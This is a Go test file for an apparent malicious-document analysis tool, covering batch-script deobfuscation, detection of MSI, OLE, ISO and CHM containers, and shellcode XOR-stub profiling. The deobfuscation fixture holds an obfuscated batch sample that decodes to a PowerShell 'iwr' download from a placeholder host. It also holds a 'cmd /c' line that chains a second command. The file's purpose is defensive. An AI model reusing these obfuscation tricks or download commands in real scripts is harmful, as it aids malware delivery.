package payload

import (
	"math/rand"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/internal/cfbtest"
)

func TestDeobfuscateBatch(t *testing.T) {
	src := strings.Join([]string{
		"NOISE LINE >nul 2>&1",
		"@echo off",
		"set a=po",
		"set \"b=wer\"",
		"set s= ",
		"set w=xxshellxx",
		"set u=http://example.invalid/AAA/x",
		":: comment",
		"rem another",
		":label",
		"%a%%b%%w:~2,5%%s%-c iwr %u:aaa=dl%",
		"%w:~-7,5%%s%%1 %~dp0",
		"setlocal enabledelayedexpansion",
		"set d=cmd",
		"!d! /c ^\"echo^ hi^\" ^& %nothing%calc",
		"%u:*AAA/=y/%",
	}, "\r\n")
	got := strings.Split(strings.TrimSpace(DeobfuscateBatch(src)), "\n")
	want := []string{
		"NOISE LINE >nul 2>&1",
		"@echo off",
		"powershell -c iwr http://example.invalid/dl/x",
		"shell %1 %~dp0",
		"setlocal enabledelayedexpansion",
		`cmd /c "echo hi" & calc`, // ^" escapes the quote, so the carets inside are escapes too
		"y/x",
	}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("got\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(want, "\n"))
	}
}

func FuzzDeobfuscateBatch(f *testing.F) {
	f.Add("set a=b\r\n%a:~1,2%%a:x=y%!a!^&%%")
	f.Fuzz(func(t *testing.T, s string) { _ = DeobfuscateBatch(s) })
}

func TestClassifyContainers(t *testing.T) {
	msi := cfbtest.BuildV4("x", make([]byte, 5000), [16]byte{0x84, 0x10, 0x0C, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46})
	if k, _ := ClassifyFile("setup.bin", msi); k != MSIKind {
		t.Fatalf("msi: %q", k)
	}
	doc := cfbtest.BuildV4("x", make([]byte, 5000), [16]byte{6, 9, 2})
	if k, _ := ClassifyFile("a.doc", doc); k != "OLE/CFB compound file" {
		t.Fatalf("cfb: %q", k)
	}
	iso := make([]byte, 0x9000)
	copy(iso[0x8001:], "CD001")
	if k, _ := ClassifyFile("x", iso); k != ISOKind {
		t.Fatalf("iso: %q", k)
	}
	if k, _ := ClassifyFile("help", append([]byte("ITSF"), make([]byte, 100)...)); k != CHMKind {
		t.Fatalf("chm: %q", k)
	}
	if k, s := ClassifyFile("embedded_1", []byte("JUNK DOCUMENT >nul 2>&1\r\n@echo off\r\nset a=b\r\n")); k != "batch script" || !s {
		t.Fatalf("batch with junk first line: %q %v", k, s)
	}
}

func TestShellcodeRandomDataNoStubs(t *testing.T) {
	// Encrypted data (a password-protected OneNote section) is random: the
	// two-byte XOR stub patterns occur by chance and must not be reported.
	rng := rand.New(rand.NewSource(1))
	b := make([]byte, 64<<10)
	rng.Read(b)
	if p := ProfileShellcode(b); p != nil && len(p.XORStubs) > 0 {
		for _, s := range p.XORStubs {
			if s.Offset >= 256 {
				t.Fatalf("XOR stub reported deep in random data: %+v", p.XORStubs)
			}
		}
	}
}
